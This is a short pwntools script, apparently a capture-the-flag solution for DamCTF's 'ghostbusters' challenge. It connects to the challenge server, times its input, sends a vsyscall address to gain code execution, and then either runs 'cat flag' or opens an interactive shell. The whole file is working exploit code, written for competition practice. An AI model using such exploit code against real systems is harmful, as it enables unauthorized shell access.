#!/usr/bin/env python3

from pwn import *
import time

program = '../ghostbusters'
#p = process(program)
p = remote("chals.damctf.xyz", 32556)
p.recvuntil(b"gonna call?\n")
time.sleep((ord('y')-time.time()) % 256)
p.sendline("0xffffffffff600400") # time

if len(sys.argv) == 2 and sys.argv[1] == "--test":
    p.sendline("cat flag")
    p.sendline("exit")
    if b"dam{" in p.recvall():
        sys.exit(0)
    else:
        sys.exit(1)
else:
    # Give shell to the user.
    p.interactive()
